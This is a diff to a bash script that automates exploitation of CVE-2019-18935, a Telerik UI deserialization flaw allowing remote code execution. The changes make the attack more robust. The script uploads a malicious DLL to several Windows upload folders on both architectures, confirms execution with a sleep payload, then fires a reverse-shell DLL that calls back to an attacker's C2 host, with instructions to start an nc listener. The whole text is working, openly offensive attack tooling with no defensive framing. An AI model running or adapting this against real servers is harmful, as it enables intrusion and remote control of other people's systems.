@@ -71,15 +71,13 @@ fi
 info "Python: $PYTHON"
 
 # ---------------------------------------------------------------- payloads
-pick_payload() { # $1 base (sleep|revshell) -> echo newest matching dll
+pick_payload() { # $1 base (sleep|revshell) -> echo newest matching dll for $ARCH
   local base="$1" p=""
-  if [ "$ARCH" = "x86" ]; then
-    p=$(ls -1t "$PAYLOAD_DIR"/${base}-*-x86.dll 2>/dev/null | head -1 || true)
-  elif [ "$ARCH" = "amd64" ]; then
-    p=$(ls -1t "$PAYLOAD_DIR"/${base}-*-amd64.dll 2>/dev/null | head -1 || true)
-  else
-    p=$(ls -1t "$PAYLOAD_DIR"/${base}-*.dll 2>/dev/null | head -1 || true)
-  fi
+  case "$ARCH" in
+    x86)   p=$(ls -1t "$PAYLOAD_DIR"/${base}-*-x86.dll 2>/dev/null | head -1 || true) ;;
+    amd64) p=$(ls -1t "$PAYLOAD_DIR"/${base}-*-amd64.dll 2>/dev/null | head -1 || true) ;;
+    *)     p=$(ls -1t "$PAYLOAD_DIR"/${base}-*.dll 2>/dev/null | head -1 || true) ;;
+  esac
   printf '%s' "$p"
 }
 SLEEP_DLL="$(pick_payload sleep)"
@@ -200,50 +198,74 @@ stage_versions() {
 }
 
 # upload + return the remote filename the target reports
-upload_payload() { # $1 dll  $2 ver  -> echo remote filename
-  local dll="$1" ver="$2"
-  log "UPLOAD: $(basename "$dll") -> $FOLDER"
+upload_payload() { # $1 dll  $2 ver  $3 folder -> echo remote filename
+  local dll="$1" ver="$2" folder="$3"
+  log "UPLOAD: $(basename "$dll") -> $folder"
   local out remote
-  out=$("$PYTHON" CVE-2019-18935.py -t -u "$TARGET_URL" -v "$ver" -f "$FOLDER" -p "$dll" 2>&1)
+  out=$("$PYTHON" CVE-2019-18935.py -t -u "$TARGET_URL" -v "$ver" -f "$folder" -p "$dll" 2>&1)
   printf '%s\n' "$out" | sed 's/^/      /'
   remote=$(printf '%s' "$out" | grep -oE "'TempFileName': '[^']+'" | head -1 | sed "s/.*'TempFileName': '//; s/'\$//")
   [ -n "$remote" ] || remote=$(printf '%s' "$out" | grep -oE '"TempFileName":"[^"]+"' | head -1 | sed 's/.*"TempFileName":"//; s/"$//')
   printf '%s' "$remote"
 }
 
-stage_exploit() {
-  [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
-  local remote
-  remote=$(upload_payload "$SLEEP_DLL" "$VERSION")
-  [ -n "$remote" ] || die "Upload did not report a remote filename — see output above."
-  info "remote file: $remote"
-
+# fire the deserialize trigger and echo the measured seconds
+trigger_and_time() { # $1 remote filename  -> echo seconds
+  local remote="$1" t0 t1 rt
   log "TRIGGER: deserializing (sleep payload -> expect ~10s pause)"
-  local t0 t1 rt
   t0=$(python3 -c 'import time;print(time.time())' 2>/dev/null || date +%s)
   "$PYTHON" CVE-2019-18935.py -d -r "$remote" -u "$TARGET_URL" -n 4.0.0.0 2>&1 | sed 's/^/      /' || true
   t1=$(python3 -c 'import time;print(time.time())' 2>/dev/null || date +%s)
   rt=$(awk "BEGIN{printf \"%.2f\", $t1-$t0}")
+  printf '%s' "$rt"
+}
 
-  local secs=${rt%.*}
-  if [ -z "$secs" ]; then secs=0; fi
-  if awk "BEGIN{exit !($rt >= 8)}"; then
-    banner "SUCCESS  -  CVE-2019-18935 CONFIRMED (RCE)"
-    info "Target : $TARGET_URL"
-    info "Version: $VERSION"
-    info "Probe  : response took ${rt}s (sleep payload fired)"
-    info ""
-    info "To get a shell, start a C2 listener, then run:  ./run.sh shell"
-    info "  (set REV_HOST/REV_PORT so the target can reach it)"
-    return 0
-  else
-    warn "Response took ${rt}s (<8s). Deserialization likely did NOT fire."
-    info "Things to try:"
-    info "  * other architecture:   ARCH=amd64 ./run.sh    (or ARCH=x86)"
-    info "  * a different version:  VERSION=<x.y.z> ./run.sh"
-    info "  * confirm handler:      ./run.sh check"
-    return 1
-  fi
+# candidate upload folders, most-likely-to-be-loadable first
+FOLDER_CANDIDATES=(
+  "${FOLDER}"
+  "C:\\inetpub\\wwwroot"
+  "C:\\inetpub\\temp"
+  "C:\\Windows\\Temp"
+  "C:\\temp"
+)
+[ -n "${FOLDER_LIST:-}" ] && FOLDER_CANDIDATES=($FOLDER_LIST)
+
+stage_exploit() {
+  [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
+  local arches
+  if [ "$ARCH" = "both" ]; then arches=(x86 amd64); else arches=("$ARCH"); fi
+
+  local a folder remote rt success=0 dll
+  for a in "${arches[@]}"; do
+    dll=$(ARCH="$a" pick_payload sleep)
+    [ -n "$dll" ] || { warn "no $a sleep payload"; continue; }
+    for folder in "${FOLDER_CANDIDATES[@]}"; do
+      [ -n "$folder" ] || continue
+      remote=$(upload_payload "$dll" "$VERSION" "$folder")
+      [ -n "$remote" ] || { info "upload gave no filename in $folder; trying next"; continue; }
+      info "remote file: $remote  (in $folder)"
+      rt=$(trigger_and_time "$remote")
+      info "response: ${rt}s"
+      if awk "BEGIN{exit !($rt >= 8)}"; then
+        banner "SUCCESS  -  CVE-2019-18935 CONFIRMED (RCE)"
+        info "Target  : $TARGET_URL"
+        info "Version : $VERSION"
+        info "Payload : $(basename "$dll")"
+        info "Folder  : $folder"
+        info "Probe   : response took ${rt}s (sleep payload fired)"
+        info ""
+        info "To get a shell:  REV_HOST=<c2-ip> REV_PORT=4444 ARCH=$a FOLDER=$folder ./run.sh shell"
+        success=1
+        break 2
+      fi
+    done
+  done
+
+  if [ "$success" -eq 1 ]; then return 0; fi
+  warn "No folder/arch combination produced a ~10s pause. Deserialization is likely being blocked."
+  info "Try manually with a specific folder the app pool can load:"
+  info "  FOLDER='C:\\inetpub\\wwwroot' ARCH=x86 ./run.sh"
+  return 1
 }
 
 stage_shell() {
@@ -257,12 +279,29 @@ stage_shell() {
   info "C2 target (the machine the WEB SERVER connects back to): $REV_HOST:$REV_PORT"
   info "Make sure a listener is running there:  nc -lvp $REV_PORT"
   info ""
-  local remote
-  remote=$(upload_payload "$REV_DLL" "$VERSION")
-  [ -n "$remote" ] || die "Upload did not report a remote filename."
-  info "remote file: $remote"
-  log "TRIGGER: deserializing reverse-shell payload..."
-  "$PYTHON" CVE-2019-18935.py -d -r "$remote" -u "$TARGET_URL" -n 4.0.0.0 2>&1 | sed 's/^/      /'
+  local arches
+  if [ "$ARCH" = "both" ]; then arches=(x86 amd64); else arches=("$ARCH"); fi
+  local a folder remote triggered=0 dll
+  for a in "${arches[@]}"; do
+    dll=$(ARCH="$a" pick_payload revshell)
+    [ -n "$dll" ] || { warn "no $a revshell payload"; continue; }
+    for folder in "${FOLDER_CANDIDATES[@]}"; do
+      [ -n "$folder" ] || continue
+      log "SHELL: uploading $(basename "$dll") -> $folder (arch $a)"
+      remote=$(upload_payload "$dll" "$VERSION" "$folder")
+      [ -n "$remote" ] || { info "no filename in $folder; trying next"; continue; }
+      info "remote file: $remote"
+      "$PYTHON" CVE-2019-18935.py -d -r "$remote" -u "$TARGET_URL" -n 4.0.0.0 2>&1 | sed 's/^/      /' || true
+      info "Fired in $folder (arch $a). Check your C2 listener for the callback."
+      triggered=1
+      # keep trying other combos in the background is overkill; stop here.
+      break 2
+    done
+  done
+  if [ "$triggered" -ne 1 ]; then
+    warn "Could not upload+trigger the shell. Confirm the working folder from the sleep test."
+    return 1
+  fi
   banner "TRIGGERED"
   info "Check your C2 listener ($REV_HOST:$REV_PORT) for the callback."
   info "If no callback: try the other arch (ARCH=amd64/x86) and/or another version."
